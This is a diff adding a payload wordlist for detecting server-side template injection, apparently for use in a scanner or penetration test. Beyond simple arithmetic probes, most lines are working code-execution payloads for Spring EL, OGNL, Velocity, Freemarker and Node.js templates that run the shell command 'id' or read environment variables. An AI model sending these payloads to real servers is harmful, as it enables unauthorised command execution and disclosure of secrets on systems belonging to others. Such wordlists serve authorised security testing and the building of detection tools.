@@ -1,0 +1,29 @@
+# Generic/Polyglot SSTI Detection Payloads
+${7*7}
+{{7*7}}
+<%= 7*7 %>
+#{7*7}
+${{7*7}}
+*{7*7}
+@(7*7)
+{{7*'7'}}
+${7*'7'}
+<%= 7*'7' %>
+{{config}}
+{{self}}
+{{dump()}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.System).getenv()}
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+@Runtime@getRuntime().exec('id')
+${class.getClassLoader()}
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getMethod('exec',$str))$ex.invoke($rt.getMethod('getRuntime').invoke(null),'id')
+$class.inspect("java.lang.Runtime").type.getMethod("exec","".class).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}
+${product.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")}
+{{constructor.constructor('return this.process.mainModule.require("child_process").execSync("id")')()}}
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
+{{this.constructor.constructor('return this.process.mainModule.require("child_process").execSync("id")')()}}
